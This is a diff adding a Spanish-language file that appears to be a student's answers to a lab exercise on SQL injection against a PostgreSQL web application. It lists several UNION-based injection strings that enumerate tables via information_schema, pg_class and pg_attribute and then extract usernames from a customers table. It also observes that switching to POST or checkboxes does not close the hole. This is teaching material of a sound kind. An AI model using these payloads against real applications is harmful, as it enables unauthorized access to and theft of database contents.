@@ -1,0 +1,41 @@
+b.insertnado lo siguinete en el campo año funcionaria:
+		-1 ' union select table_name from information_schema.columns where table_name like '%
+
+	pero hay mas formas esta por ejemplo:
+		-1' union select relname from pg_class where relname like '%
+	El problema esta en filtrarlas ya que las que son tipo pg_ no nos interesan ya que son
+	genradas por el pgadmin y no son verdaderamente tablas de la base de datos sino tablas
+	del sistema, por lo que no nos interesan.
+
+c. por ahora esto: 
+	-1' union select * from information_schema.tables where table_schema like 'public
+
+f. esto:
+-1' union   select column_name from information_schema.columns where table_name like 'customers
+
+g. username
+
+h. esto:
+	-1' union select username from customers where username like '%
+
+f. con POST solo no cambia nada, con checkbox no cambia nada y con POST y checkbox no se puede hacer insercion desde la pagina.
+	Aun asi sigue sin ser seguro ya que con cualquier navegador puedo copiarme los formularios a una pagina mia y adaptarlos 
+	para que pasen los valores que yo deseo
+
+
+.otra version
+-1' union select cast(oid as varchar) from  pg_namespace where nspname like 'public
+-1' union select relname from pg_class where relnamespace = 2200 or relname like '-1
+buscar en la tabla pg_attribute la que coincida con oid=attrelid donde oid es el oid de la tabla customers
+
+ -1' union select cast (oid as varchar) from pg_class where relname like 'customers' or relname like '-1
+	obtenemos que el oid es 25283
+	
+	nos vamos a pg_atribute y buscamos lo siguiente 
+-1' union select attname from pg_attribute where attrelid =25283 or attname like '-1
+	obtenemos un listado completo de las columnas que tenemos en la tabla cutomers aqui lo que nos interea
+	es la columna username que usaremos para la siguiente query
+	
+-1' union select username from customers where username like '%
+
+
